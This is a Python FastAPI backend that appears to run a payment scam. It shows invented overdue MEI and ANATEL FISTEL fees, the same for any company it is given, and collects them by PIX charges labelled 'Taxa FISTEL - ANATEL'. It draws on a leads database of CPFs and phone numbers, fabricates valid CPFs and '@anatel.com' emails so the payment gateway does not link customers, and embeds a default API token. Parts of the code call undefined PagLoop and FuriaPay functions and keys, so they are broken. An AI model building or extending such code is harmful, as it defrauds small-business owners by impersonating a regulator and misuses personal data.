from fastapi import FastAPI, APIRouter, HTTPException, UploadFile, File, BackgroundTasks, Depends
from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
from dotenv import load_dotenv
from starlette.middleware.cors import CORSMiddleware
from motor.motor_asyncio import AsyncIOMotorClient
import os
import logging
from pathlib import Path
from pydantic import BaseModel, Field, ConfigDict
from typing import List, Optional, Dict, Any
import uuid
from datetime import datetime, timezone, timedelta
import httpx
import base64
import json
import csv
import io
import random
from jose import JWTError, jwt
from passlib.context import CryptContext

ROOT_DIR = Path(__file__).parent
# Carregar apenas o .env do backend (todas as variáveis estão aqui agora)
load_dotenv(ROOT_DIR / '.env')

# MongoDB connection
mongo_url = os.environ['MONGO_URL']
client = AsyncIOMotorClient(mongo_url)
db = client[os.environ['DB_NAME']]

# Gateway Configuration
GATEWAY_FILE = Path('/app/.gateway')

# Zippify API Configuration (Gateway Principal)
ZIPPIFY_BASE_URL = os.getenv('ZIPPIFY_BASE_URL', 'https://api.zippify.com.br/api/public/v1')
ZIPPIFY_API_TOKEN = os.getenv('ZIPPIFY_API_TOKEN', 'pqWpAXkg9tAdxAm07xAQ4d6IODUw6C5Y0u7oL0CpfN92RFfpsqvJRkDpPqhU')
ZIPPIFY_OFFER_HASH = os.getenv('ZIPPIFY_OFFER_HASH', 'xfwh7be0ef')
ZIPPIFY_PRODUCT_HASH = os.getenv('ZIPPIFY_PRODUCT_HASH', 'rrabdugdeq')

# InverTexto API Configuration
INVERTEXTO_API_TOKEN = os.getenv('INVERTEXTO_API_TOKEN', '')
INVERTEXTO_BASE_URL = os.getenv('INVERTEXTO_BASE_URL', 'https://api.invertexto.com/v1')

# Auth Configuration
SECRET_KEY = os.environ['JWT_SECRET_KEY']
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 60 * 24  # 24 horas

# Senha do admin
ADMIN_USERNAME = os.environ['ADMIN_USERNAME']
ADMIN_PASSWORD_HASH = os.environ['ADMIN_PASSWORD_HASH']

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")
security = HTTPBearer()

# Create the main app
app = FastAPI(title="MEI Payment System API")
api_router = APIRouter(prefix="/api")

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


# Models
class CNPJConsulta(BaseModel):
    cnpj: str

class CNPJResponse(BaseModel):
    cnpj: str
    nome: str
    situacao: str
    telefone: Optional[str] = None
    is_lead: bool = False
    cpf_lead: Optional[str] = None  # CPF extraído do nome do lead

class DebitoItem(BaseModel):
    mes: str
    valor: float
    status: str

class DebitosResponse(BaseModel):
    cnpj: str
    total: float
    quantidade_meses: int
    debitos: List[DebitoItem]

class PagamentoRequest(BaseModel):
    cnpj: str
    nome: str
    email: Optional[str] = "contato@mei.com"
    valor: float
    cpf_lead: Optional[str] = None  # CPF do lead (se disponível)

class PagamentoRequest2026(BaseModel):
    cnpj: str
    nome: str
    email: Optional[str] = "contato@mei.com"
    valor: float
    cpf_anterior: str  # CPF usado no primeiro PIX

class PagamentoResponse(BaseModel):
    id: str
    qr_code: str
    valor: float
    status: str
    gateway: str
    cpf_utilizado: Optional[str] = None  # CPF usado na transação

class GatewayResponse(BaseModel):
    gateway: str
    disponiveis: List[str]

class LoginRequest(BaseModel):
    username: str
    password: str

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"


# Helper Functions
def verify_password(plain_password: str, hashed_password: str) -> bool:
    """Verifica senha"""
    return pwd_context.verify(plain_password, hashed_password)

def create_access_token(data: dict, expires_delta: Optional[timedelta] = None):
    """Cria JWT token"""
    to_encode = data.copy()
    expire = datetime.now(timezone.utc) + (expires_delta or timedelta(minutes=15))
    to_encode.update({"exp": expire})
    encoded_jwt = jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
    return encoded_jwt

async def get_current_user(credentials: HTTPAuthorizationCredentials = Depends(security)):
    """Verifica token JWT"""
    try:
        token = credentials.credentials
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        username: str = payload.get("sub")
        if username is None:
            raise HTTPException(status_code=401, detail="Token inválido")
        return username
    except JWTError:
        raise HTTPException(status_code=401, detail="Token inválido ou expirado")

def get_active_gateway() -> str:
    """Lê o gateway ativo do arquivo .gateway"""
    try:
        if GATEWAY_FILE.exists():
            gateway = GATEWAY_FILE.read_text().strip()
            if gateway in ['furiapay', 'pagloop']:
                return gateway
    except Exception as e:
        logger.error(f"Erro ao ler gateway: {e}")
    return 'pagloop'  # Default

def set_active_gateway(gateway: str) -> bool:
    """Define o gateway ativo"""
    try:
        if gateway in ['furiapay', 'pagloop']:
            GATEWAY_FILE.write_text(gateway)
            return True
    except Exception as e:
        logger.error(f"Erro ao salvar gateway: {e}")
    return False




# Zippify Integration (Gateway Principal)

def gerar_cpf_valido() -> str:
    """Gera um CPF válido aleatório para cada transação
    
    A API Zippify requer CPF válido e trata como mesmo cliente se repetir.
    Gerando CPF único para cada transação usando secrets para garantir aleatoriedade.
    """
    import secrets
    
    while True:
        # Gera os 9 primeiros dígitos aleatoriamente
        cpf = [secrets.randbelow(10) for _ in range(9)]
        
        # Evitar CPFs com todos os dígitos iguais (inválidos)
        if len(set(cpf)) == 1:
            continue
        
        # Calcula o primeiro dígito verificador
        soma = sum((10 - i) * cpf[i] for i in range(9))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        # Calcula o segundo dígito verificador
        soma = sum((11 - i) * cpf[i] for i in range(10))
        resto = soma % 11
        cpf.append(0 if resto < 2 else 11 - resto)
        
        cpf_str = ''.join(map(str, cpf))
        
        # Validar CPF gerado
        if validar_cpf(cpf_str):
            return cpf_str


def validar_cpf(cpf: str) -> bool:
    """Valida se um CPF é válido"""
    # Remove caracteres não numéricos
    cpf = ''.join(filter(str.isdigit, cpf))
    
    # Verifica se tem 11 dígitos
    if len(cpf) != 11:
        return False
    
    # Verifica se todos os dígitos são iguais
    if cpf == cpf[0] * 11:
        return False
    
    # Valida primeiro dígito verificador
    soma = sum(int(cpf[i]) * (10 - i) for i in range(9))
    resto = soma % 11
    digito1 = 0 if resto < 2 else 11 - resto
    if int(cpf[9]) != digito1:
        return False
    
    # Valida segundo dígito verificador
    soma = sum(int(cpf[i]) * (11 - i) for i in range(10))
    resto = soma % 11
    digito2 = 0 if resto < 2 else 11 - resto
    if int(cpf[10]) != digito2:
        return False
    
    return True


async def zippify_create_pix(valor: float, cnpj: str, nome: str, email: str, phone: str = "11999999999", cpf_especifico: str = None) -> Dict[str, Any]:
    """Cria pagamento PIX no Zippify - Gateway Principal
    
    API: https://api.zippify.com.br/api/public/v1/transactions
    Documentação: Zippify Public API v1
    
    IMPORTANTE: A API Zippify só aceita CPF e trata documentos repetidos como mesmo cliente.
    Se cpf_especifico for fornecido, usa ele (para segunda cobrança do mesmo cliente).
    Caso contrário, gera um CPF válido único.
    """
    try:
        # Converter valor para centavos (API espera em centavos)
        amount_cents = int(valor * 100)
        
        # Limpar CNPJ para usar no email
        cnpj_limpo = cnpj.replace('.', '').replace('/', '').replace('-', '')
        cnpj_basico = cnpj_limpo[:8] if len(cnpj_limpo) >= 8 else cnpj_limpo
        
        # Usar CPF específico se fornecido, senão gerar novo
        if cpf_especifico and validar_cpf(cpf_especifico):
            cpf_unico = cpf_especifico
            logger.info(f"[ZIPPIFY] Usando CPF anterior: {cpf_unico}")
        else:
            cpf_unico = gerar_cpf_valido()
            logger.info(f"[ZIPPIFY] CPF gerado para transação: {cpf_unico}")
        
        # Email único usando CNPJ básico (garantir que nunca seja vazio)
        if cnpj_basico:
            email_unico = f"{cnpj_basico}@anatel.com"
        else:
            import secrets
            email_unico = f"cliente{secrets.randbelow(999999)}@anatel.com"
        
        # Gerar telefone único
        import secrets
        phone_unico = f"119{secrets.randbelow(90000000) + 10000000}"
        
        logger.info(f"[ZIPPIFY] Email: {email_unico}")
        
        # Payload conforme documentação Zippify
        payload = {
            "offer_hash": ZIPPIFY_OFFER_HASH,
            "amount": amount_cents,
            "payment_method": "pix",
            "customer": {
                "name": nome or "Cliente ANATEL",
                "email": email_unico,
                "phone_number": phone_unico,
                "document": cpf_unico  # CPF válido
            },
            "cart": [
                {
                    "product_hash": ZIPPIFY_PRODUCT_HASH,
                    "title": "Taxa FISTEL - ANATEL",
                    "price": amount_cents,
                    "quantity": 1,
                    "operation_type": 1,
                    "tangible": False
                }
            ]
        }
        
        logger.info(f"[ZIPPIFY] Criando PIX - Valor: R$ {valor:.2f} ({amount_cents} centavos)")
        logger.info(f"[ZIPPIFY] CPF: {cpf_unico}")
        
        async with httpx.AsyncClient(timeout=60.0) as client:
            response = await client.post(
                f"{ZIPPIFY_BASE_URL}/transactions",
                params={"api_token": ZIPPIFY_API_TOKEN},
                headers={
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                json=payload
            )
            
            logger.info(f"[ZIPPIFY] Response status: {response.status_code}")
            
            if response.status_code not in [200, 201]:
                logger.error(f"[ZIPPIFY] Error response: {response.text[:500]}")
                raise HTTPException(status_code=response.status_code, detail=f"Erro Zippify: {response.text[:200]}")
            
            data = response.json()
            logger.info(f"[ZIPPIFY] Response data keys: {data.keys() if isinstance(data, dict) else 'not dict'}")
            
            # Extrair dados do PIX da resposta Zippify
            transaction_id = data.get('id') or data.get('hash') or str(uuid.uuid4())
            
            # O QR code está em pix.pix_qr_code na resposta Zippify
            pix_data = data.get('pix', {})
            qr_code = (
                pix_data.get('pix_qr_code') or 
                pix_data.get('qr_code') or
                pix_data.get('pix_qrcode') or
                data.get('pix_qrcode') or 
                data.get('qr_code') or 
                ''
            )
            
            status = data.get('payment_status') or data.get('status') or 'waiting_payment'
            
            logger.info(f"[ZIPPIFY] Transaction ID: {transaction_id}")
            logger.info(f"[ZIPPIFY] QR Code length: {len(qr_code) if qr_code else 0}")
            logger.info(f"[ZIPPIFY] Status: {status}")
            
            return {
                'id': str(transaction_id),
                'qr_code': qr_code,
                'valor': valor,
                'status': status,
                'gateway': 'zippify',
                'cpf_utilizado': cpf_unico,  # Retornar CPF usado
                'raw_response': data
            }
            
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[ZIPPIFY] Erro ao criar PIX: {str(e)}")
        raise HTTPException(status_code=500, detail=f"Erro ao gerar PIX Zippify: {str(e)}")


# API Endpoints
@api_router.get("/")
async def root():
    return {"message": "MEI Payment System API", "version": "2.0"}

@app.get("/health")
async def health_check():
    """Health check endpoint para Kubernetes"""
    try:
        # Verificar se MongoDB está conectado
        await db.command('ping')
        return {
            "status": "healthy",
            "service": "MEI Payment System",
            "database": "connected"
        }
    except Exception as e:
        logger.error(f"Health check failed: {e}")
        raise HTTPException(status_code=503, detail="Service unavailable")

@api_router.post("/auth/login", response_model=TokenResponse)
async def login(credentials: LoginRequest):
    """Login administrativo - retorna JWT token"""
    
    # Verificar credenciais
    if credentials.username != ADMIN_USERNAME:
        raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")
    
    if not verify_password(credentials.password, ADMIN_PASSWORD_HASH):
        raise HTTPException(status_code=401, detail="Usuário ou senha incorretos")
    
    # Criar token
    access_token = create_access_token(
        data={"sub": credentials.username},
        expires_delta=timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES)
    )
    
    logger.info(f"Login bem-sucedido: {credentials.username}")
    
    return TokenResponse(access_token=access_token)

@api_router.get("/auth/verify")
async def verify_token(current_user: str = Depends(get_current_user)):
    """Verifica se token é válido"""
    return {"valid": True, "username": current_user}

@api_router.post("/cnpj/consultar", response_model=CNPJResponse)
async def consultar_cnpj(data: CNPJConsulta):
    """Consulta dados do CNPJ - Prioriza base de leads local"""
    cnpj_limpo = data.cnpj.replace(".", "").replace("/", "").replace("-", "")
    
    # PASSO 0: Verificar BASE DE LEADS primeiro (prioridade máxima)
    try:
        lead = await db.leads_anatel.find_one({'cnpj': cnpj_limpo}, {'_id': 0})
        
        if lead:
            logger.info(f"[LEADS] CNPJ {cnpj_limpo} encontrado na base de leads!")
            
            # Marcar como visualizado
            await db.leads_anatel.update_one(
                {'cnpj': cnpj_limpo},
                {'$set': {'visualizado': True, 'data_visualizacao': datetime.now(timezone.utc).isoformat()}}
            )
            
            # Formatar telefone
            telefone = lead.get('telefone', '')
            if telefone and len(telefone) >= 10:
                telefone_formatado = f"({telefone[:2]}) {telefone[2:]}"
            else:
                telefone_formatado = telefone
            
            # Extrair CPF do nome (11 dígitos no final)
            razao_social = lead.get('razao_social', 'Empresa')
            cpf_extraido = None
            import re
            cpf_match = re.search(r'(\d{11})$', razao_social)
            if cpf_match:
                cpf_extraido = cpf_match.group(1)
                logger.info(f"[LEADS] CPF extraído do nome: {cpf_extraido}")
            
            return CNPJResponse(
                cnpj=data.cnpj,
                nome=lead.get('razao_social', 'Empresa'),
                situacao='ATIVA',
                telefone=telefone_formatado,
                is_lead=True,
                cpf_lead=cpf_extraido
            )
    except Exception as e:
        logger.error(f"[LEADS] Erro ao consultar: {e}")
    
    # PASSO 1: Verificar CACHE
    try:
        cache_doc = await db.cnpjs_cache.find_one(
            {'cnpj_raw': cnpj_limpo},
            {'_id': 0}
        )
        
        if cache_doc:
            cache_age_days = (datetime.now(timezone.utc) - datetime.fromisoformat(cache_doc['cached_at'])).days
            
            if cache_age_days < 7:
                logger.info(f"[CACHE] CNPJ {cnpj_limpo} encontrado ({cache_age_days}d)")
                
                await db.cnpjs_cache.update_one(
                    {'cnpj_raw': cnpj_limpo},
                    {'$inc': {'hit_count': 1}}
                )
                
                return CNPJResponse(
                    cnpj=cache_doc.get('cnpj_formatado', data.cnpj),
                    nome=cache_doc.get('razao_social', 'Empresa'),
                    situacao=cache_doc.get('situacao', 'ATIVA'),
                    telefone=None,
                    is_lead=False
                )
    except Exception as e:
        logger.error(f"Erro cache: {e}")
    
    # PASSO 2: API INVERTEXTO (Principal)
    if INVERTEXTO_API_TOKEN:
        try:
            logger.info(f"[INVERTEXTO] Consultando {cnpj_limpo}...")
            
            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.get(
                    f"{INVERTEXTO_BASE_URL}/cnpj/{cnpj_limpo}",
                    params={"token": INVERTEXTO_API_TOKEN}
                )
                
                logger.info(f"[INVERTEXTO] Status: {response.status_code}")
                
                if response.status_code == 200:
                    api_data = response.json()
                    logger.info(f"[INVERTEXTO] Dados recebidos: {api_data.get('razao_social', 'N/A')}")
                    
                    # Salvar no cache
                    cache_doc = {
                        'cnpj_raw': cnpj_limpo,
                        'cnpj_formatado': api_data.get('cnpj', data.cnpj),
                        'razao_social': api_data.get('razao_social', 'Empresa'),
                        'situacao': api_data.get('situacao', {}).get('nome', 'ATIVA') if isinstance(api_data.get('situacao'), dict) else 'ATIVA',
                        'fonte': 'invertexto',
                        'cached_at': datetime.now(timezone.utc).isoformat(),
                        'hit_count': 0
                    }
                    
                    try:
                        await db.cnpjs_cache.insert_one(cache_doc)
                        logger.info("[INVERTEXTO] Salvo no cache")
                    except Exception:
                        pass
                    
                    return CNPJResponse(
                        cnpj=api_data.get('cnpj', data.cnpj),
                        nome=api_data.get('razao_social', 'Empresa'),
                        situacao=cache_doc['situacao'],
                        telefone=None,
                        is_lead=False
                    )
                else:
                    logger.warning(f"[INVERTEXTO] Status não-200: {response.status_code}")
                    logger.warning(f"[INVERTEXTO] Response: {response.text[:200]}")
        except Exception as e:
            logger.error(f"[INVERTEXTO] Erro: {str(e)}")
    
    # PASSO 3: FALLBACK - Mockado
    logger.info(f"[MOCKADO] Usando fallback para {cnpj_limpo}")
    
    ultimos_digitos = cnpj_limpo[-4:] if len(cnpj_limpo) >= 4 else "0001"
    
    return CNPJResponse(
        cnpj=data.cnpj,
        nome=f"EMPRESA MEI {ultimos_digitos} LTDA",
        situacao="ATIVA",
        telefone=None,
        is_lead=False
    )

@api_router.get("/cnpj/{cnpj}/debitos", response_model=DebitosResponse)
async def obter_debitos(cnpj: str):
    """Retorna débitos DAS do CNPJ"""
    # Para MVP, retornando dados fixos
    # Em produção, consultaria banco de dados real
    return DebitosResponse(
        cnpj=cnpj,
        total=161.80,
        quantidade_meses=2,
        debitos=[
            DebitoItem(mes="Maio/2025", valor=80.90, status="EM ABERTO"),
            DebitoItem(mes="Abril/2025", valor=80.90, status="EM ABERTO")
        ]
    )


# ─── ANATEL / FISTEL Models ────────────────────────────────────────────────────

class AnatelTaxaItem(BaseModel):
    tipo: str
    periodo: str
    principal: float
    acrescimos: float
    total_item: float

class AnatelTaxasResponse(BaseModel):
    cnpj: str
    servico: str
    num_estacoes: int
    quantidade_anos: int
    total: float
    taxas: List[AnatelTaxaItem]

# ─── ANATEL Endpoints ──────────────────────────────────────────────────────────

@api_router.get("/anatel/taxas/{cnpj}", response_model=AnatelTaxasResponse)
async def obter_taxas_anatel(cnpj: str):
    """Retorna débitos de Taxa FISTEL da ANATEL para o CNPJ informado"""
    import random

    cnpj_limpo = cnpj.replace(".", "").replace("/", "").replace("-", "")
    # Usa os últimos 4 dígitos do CNPJ para variar levemente os valores
    seed = int(cnpj_limpo[-4:]) if cnpj_limpo else 1234
    random.seed(seed)

    # Taxa fixa: Principal R$ 57,38 + Acréscimos (multa 20%)
    valor_principal = 57.38
    valor_acrescimos = round(valor_principal * 0.20, 2)  # R$ 11,48
    valor_total = round(valor_principal + valor_acrescimos, 2)  # R$ 68,86

    # Apenas 1 ano em atraso
    anos_atraso = 1

    taxas = []
    anos_referencia = [2025]

    total_geral = 0.0

    for ano in anos_referencia:
        # TFF – Taxa de Fiscalização de Funcionamento
        taxas.append(AnatelTaxaItem(
            tipo="TFF – Taxa de Fiscalização de Funcionamento",
            periodo=f"Exercício {ano}",
            principal=valor_principal,
            acrescimos=valor_acrescimos,
            total_item=valor_total
        ))
        total_geral += valor_total

    total_geral = round(total_geral, 2)

    # Serviço fixo para linha telefônica móvel empresarial
    servico = "SME – Serviço Móvel Empresarial"

    return AnatelTaxasResponse(
        cnpj=cnpj,
        servico=servico,
        num_estacoes=1,
        quantidade_anos=anos_atraso,
        total=total_geral,
        taxas=taxas
    )


@api_router.post("/pagamento/pix", response_model=PagamentoResponse)
async def gerar_pix(data: PagamentoRequest):
    """Gera QR Code PIX usando Zippify (gateway principal)"""
    
    logger.info(f"[PIX] Gerando via ZIPPIFY - Valor: R$ {data.valor}")
    if data.cpf_lead:
        logger.info(f"[PIX] Tentando com CPF do lead: {data.cpf_lead}")
    
    result = None
    cpf_usado = data.cpf_lead
    
    # Primeira tentativa: usar CPF do lead (se disponível)
    if data.cpf_lead:
        try:
            result = await zippify_create_pix(
                valor=data.valor,
                cnpj=data.cnpj,
                nome=data.nome,
                email=data.email or "contato@empresa.com",
                phone="11999999999",
                cpf_especifico=data.cpf_lead
            )
            logger.info(f"[PIX] Sucesso com CPF do lead: {data.cpf_lead}")
        except Exception as e:
            logger.warning(f"[PIX] Erro com CPF do lead ({data.cpf_lead}): {e}")
            logger.info("[PIX] Tentando com CPF aleatório...")
            cpf_usado = None  # Forçar uso de CPF aleatório
    
    # Segunda tentativa ou única tentativa: CPF aleatório
    if result is None:
        try:
            result = await zippify_create_pix(
                valor=data.valor,
                cnpj=data.cnpj,
                nome=data.nome,
                email=data.email or "contato@empresa.com",
                phone="11999999999",
                cpf_especifico=None  # Gerar CPF aleatório
            )
            logger.info(f"[PIX] Sucesso com CPF aleatório: {result.get('cpf_utilizado')}")
        except Exception as e:
            logger.error(f"[PIX] Erro ao gerar PIX: {e}")
            raise HTTPException(status_code=500, detail=str(e))
    
    # Salvar transação no MongoDB
    transaction = {
        'id': result['id'],
        'cnpj': data.cnpj,
        'nome': data.nome,
        'valor': data.valor,
        'qr_code': result['qr_code'],
        'status': result['status'],
        'gateway': result['gateway'],
        'cpf_utilizado': result.get('cpf_utilizado'),
        'cpf_lead_original': data.cpf_lead,  # Guardar CPF original do lead
        'created_at': datetime.now(timezone.utc).isoformat(),
        'updated_at': datetime.now(timezone.utc).isoformat()
    }
    await db.transactions.insert_one(transaction)
    
    return PagamentoResponse(
        id=result['id'],
        qr_code=result['qr_code'],
        valor=result['valor'],
        status=result['status'],
        gateway=result['gateway'],
        cpf_utilizado=result.get('cpf_utilizado')
    )


@api_router.post("/pagamento/pix-2026", response_model=PagamentoResponse)
async def gerar_pix_2026(data: PagamentoRequest2026):
    """Gera QR Code PIX para exercício 2026 usando MESMO CPF do primeiro pagamento"""
    
    logger.info(f"[PIX 2026] Gerando via ZIPPIFY - Valor: R$ {data.valor} - CPF anterior: {data.cpf_anterior}")
    
    try:
        # Usar Zippify com o MESMO CPF do primeiro pagamento
        result = await zippify_create_pix(
            valor=data.valor,
            cnpj=data.cnpj,
            nome=data.nome,
            email=data.email or "contato@empresa.com",
            phone="11999999999",
            cpf_especifico=data.cpf_anterior  # Usar mesmo CPF
        )
        
        # Salvar transação no MongoDB
        transaction = {
            'id': result['id'],
            'cnpj': data.cnpj,
            'nome': data.nome,
            'valor': data.valor,
            'qr_code': result['qr_code'],
            'status': result['status'],
            'gateway': result['gateway'],
            'cpf_utilizado': result.get('cpf_utilizado'),
            'exercicio': '2026',
            'created_at': datetime.now(timezone.utc).isoformat(),
            'updated_at': datetime.now(timezone.utc).isoformat()
        }
        await db.transactions.insert_one(transaction)
        
        return PagamentoResponse(
            id=result['id'],
            qr_code=result['qr_code'],
            valor=result['valor'],
            status=result['status'],
            gateway=result['gateway'],
            cpf_utilizado=result.get('cpf_utilizado')
        )
        
    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Erro ao gerar PIX 2026: {e}")
        raise HTTPException(status_code=500, detail=str(e))

@api_router.get("/pagamento/status/{transaction_id}")
async def verificar_status(transaction_id: str):
    """Verifica status do pagamento"""
    # Buscar no banco
    transaction = await db.transactions.find_one({'id': transaction_id}, {'_id': 0})
    
    if not transaction:
        raise HTTPException(status_code=404, detail="Transação não encontrada")
    
    gateway = transaction.get('gateway', 'pagloop')
    
    # Consultar gateway para atualizar status
    try:
        if gateway == 'pagloop':
            # PagLoop status endpoint
            token = await pagloop_authenticate()
            async with httpx.AsyncClient(timeout=15.0) as client:
                response = await client.get(
                    f"{PAGLOOP_BASE_URL}/api/transactions/getStatusTransac/{transaction_id}",
                    headers={"Authorization": f"Bearer {token}"}
                )
                if response.status_code == 200:
                    data = response.json()
                    new_status = data.get('status', transaction['status'])
                    
                    # Atualizar no banco
                    await db.transactions.update_one(
                        {'id': transaction_id},
                        {'$set': {'status': new_status, 'updated_at': datetime.now(timezone.utc).isoformat()}}
                    )
                    transaction['status'] = new_status
        else:
            # FuriaPay status endpoint
            credentials = f"{FURIAPAY_PUBLIC_KEY}:{FURIAPAY_SECRET_KEY}"
            auth_header = 'Basic ' + base64.b64encode(credentials.encode()).decode()
            
            async with httpx.AsyncClient(timeout=15.0) as client:
                response = await client.get(
                    f"{FURIAPAY_BASE_URL}/transactions/{transaction_id}",
                    headers={"Authorization": auth_header}
                )
                if response.status_code == 200:
                    data = response.json()
                    new_status = data.get('status', transaction['status'])
                    
                    await db.transactions.update_one(
                        {'id': transaction_id},
                        {'$set': {'status': new_status, 'updated_at': datetime.now(timezone.utc).isoformat()}}
                    )
                    transaction['status'] = new_status
    except Exception as e:
        logger.warning(f"Erro ao atualizar status: {e}")
    
    return transaction

# Endpoint de simulação para testes (REMOVER EM PRODUÇÃO)
@api_router.post("/pagamento/simular-aprovacao/{transaction_id}")
async def simular_aprovacao(transaction_id: str):
    """APENAS PARA TESTES - Simula aprovação do PIX
    
    REMOVER ESTE ENDPOINT ANTES DE IR PARA PRODUÇÃO!
    """
    # Buscar transação
    transaction = await db.transactions.find_one({'id': transaction_id})
    
    if not transaction:
        # Tentar buscar como string
        transaction = await db.transactions.find_one({'id': str(transaction_id)})
    
    if not transaction:
        raise HTTPException(status_code=404, detail="Transação não encontrada")
    
    # Atualizar status para aprovado
    await db.transactions.update_one(
        {'id': transaction_id},
        {
            '$set': {
                'status': 'paid',
                'paid_at': datetime.now(timezone.utc).isoformat(),
                'updated_at': datetime.now(timezone.utc).isoformat()
            }
        }
    )
    
    # Marcar lead como pagamento realizado
    cnpj = transaction.get('cnpj', '').replace('.', '').replace('/', '').replace('-', '')
    if cnpj:
        await db.leads_anatel.update_one(
            {'cnpj': cnpj},
            {'$set': {'pagamento_realizado': True, 'data_pagamento': datetime.now(timezone.utc).isoformat()}}
        )
    
    logger.info(f"[SIMULAÇÃO] Pagamento {transaction_id} aprovado manualmente")
    
    return {
        "success": True,
        "message": "Pagamento simulado como aprovado",
        "transaction_id": transaction_id,
        "status": "paid"
    }

@api_router.get("/gateway/current", response_model=GatewayResponse)
async def get_gateway():
    """Retorna gateway ativo"""
    return GatewayResponse(
        gateway=get_active_gateway(),
        disponiveis=['furiapay', 'pagloop']
    )

@api_router.post("/gateway/switch")
async def switch_gateway(gateway: str):
    """Troca o gateway ativo"""
    if gateway not in ['furiapay', 'pagloop']:
        raise HTTPException(status_code=400, detail="Gateway inválido")
    
    if set_active_gateway(gateway):
        return {"success": True, "gateway": gateway, "message": f"Gateway alterado para {gateway}"}
    else:
        raise HTTPException(status_code=500, detail="Erro ao trocar gateway")

@api_router.post("/webhook/pagloop")
async def webhook_pagloop(payload: Dict[str, Any]):
    """Webhook do PagLoop para notificações de pagamento"""
    logger.info(f"Webhook PagLoop recebido: {payload}")
    
    transaction_id = payload.get('transactionId') or payload.get('id')
    status = payload.get('status')
    
    if transaction_id and status:
        await db.transactions.update_one(
            {'id': transaction_id},
            {'$set': {'status': status, 'updated_at': datetime.now(timezone.utc).isoformat()}}
        )
    
    return {"success": True}

@api_router.post("/webhook/furiapay")
async def webhook_furiapay(payload: Dict[str, Any]):
    """Webhook do FuriaPay para notificações de pagamento"""
    logger.info(f"Webhook FuriaPay recebido: {payload}")
    
    transaction_id = payload.get('id')
    status = payload.get('status')
    
    if transaction_id and status:
        await db.transactions.update_one(
            {'id': str(transaction_id)},
            {'$set': {'status': status, 'updated_at': datetime.now(timezone.utc).isoformat()}}
        )
    
    return {"success": True}

@api_router.get("/transactions", response_model=List[dict])
async def list_transactions(limit: int = 50):
    """Lista transações recentes"""
    transactions = await db.transactions.find(
        {}, 
        {"_id": 0}
    ).sort("created_at", -1).limit(limit).to_list(limit)
    
    return transactions


# Dashboard Endpoints
@api_router.get("/dashboard/stats")
async def dashboard_stats(current_user: str = Depends(get_current_user)):
    """Estatísticas gerais do dashboard"""
    try:
        # Total de transações
        total_transacoes = await db.transactions.count_documents({})
        
        # Total arrecadado
        pipeline_total = [
            {"$group": {"_id": None, "total": {"$sum": "$valor"}}}
        ]
        result_total = await db.transactions.aggregate(pipeline_total).to_list(1)
        total_arrecadado = result_total[0]["total"] if result_total else 0
        
        # Transações por status
        pipeline_status = [
            {"$group": {"_id": "$status", "count": {"$sum": 1}}}
        ]
        status_counts = await db.transactions.aggregate(pipeline_status).to_list(10)
        
        # Transações por gateway
        pipeline_gateway = [
            {"$group": {"_id": "$gateway", "count": {"$sum": 1}, "total": {"$sum": "$valor"}}}
        ]
        gateway_stats = await db.transactions.aggregate(pipeline_gateway).to_list(10)
        
        # Últimas 24h
        from datetime import timedelta
        yesterday = (datetime.now(timezone.utc) - timedelta(days=1)).isoformat()
        transacoes_24h = await db.transactions.count_documents({
            "created_at": {"$gte": yesterday}
        })
        
        # Taxa de sucesso
        total_pagas = await db.transactions.count_documents({"status": {"$in": ["paid", "approved", "CONFIRMED"]}})
        taxa_sucesso = (total_pagas / total_transacoes * 100) if total_transacoes > 0 else 0
        
        return {
            "total_transacoes": total_transacoes,
            "total_arrecadado": round(total_arrecadado, 2),
            "transacoes_24h": transacoes_24h,
            "taxa_sucesso": round(taxa_sucesso, 2),
            "por_status": status_counts,
            "por_gateway": gateway_stats,
            "gateway_ativo": get_active_gateway()
        }
    except Exception as e:
        logger.error(f"Erro ao buscar stats: {e}")
        return {
            "total_transacoes": 0,
            "total_arrecadado": 0,
            "transacoes_24h": 0,
            "taxa_sucesso": 0,
            "por_status": [],
            "por_gateway": [],
            "gateway_ativo": get_active_gateway()
        }

@api_router.get("/dashboard/grafico")
async def dashboard_chart(days: int = 7, current_user: str = Depends(get_current_user)):
    """Dados para gráfico de transações por dia"""
    try:
        from datetime import timedelta
        
        # Últimos N dias
        start_date = datetime.now(timezone.utc) - timedelta(days=days)
        
        pipeline = [
            {"$match": {"created_at": {"$gte": start_date.isoformat()}}},
            {
                "$group": {
                    "_id": {"$substr": ["$created_at", 0, 10]},
                    "count": {"$sum": 1},
                    "total": {"$sum": "$valor"}
                }
            },
            {"$sort": {"_id": 1}}
        ]
        
        result = await db.transactions.aggregate(pipeline).to_list(days)
        
        # Preencher dias sem transações
        chart_data = []
        for i in range(days):
            date = (datetime.now(timezone.utc) - timedelta(days=days-i-1)).strftime('%Y-%m-%d')
            existing = next((r for r in result if r["_id"] == date), None)
            chart_data.append({
                "date": date,
                "count": existing["count"] if existing else 0,
                "total": round(existing["total"], 2) if existing else 0
            })
        
        return chart_data
    except Exception as e:
        logger.error(f"Erro ao gerar gráfico: {e}")
        return []

@api_router.get("/dashboard/transacoes")
async def dashboard_transactions(
    status: Optional[str] = None,
    gateway: Optional[str] = None,
    data_inicio: Optional[str] = None,
    data_fim: Optional[str] = None,
    limit: int = 100,
    current_user: str = Depends(get_current_user)
):
    """Lista transações com filtros"""
    try:
        query = {}
        
        if status:
            query["status"] = status
        
        if gateway:
            query["gateway"] = gateway
        
        if data_inicio or data_fim:
            query["created_at"] = {}
            if data_inicio:
                query["created_at"]["$gte"] = data_inicio
            if data_fim:
                query["created_at"]["$lte"] = data_fim
        
        transactions = await db.transactions.find(
            query,
            {"_id": 0}
        ).sort("created_at", -1).limit(limit).to_list(limit)
        
        return transactions
    except Exception as e:
        logger.error(f"Erro ao listar transações: {e}")
        return []


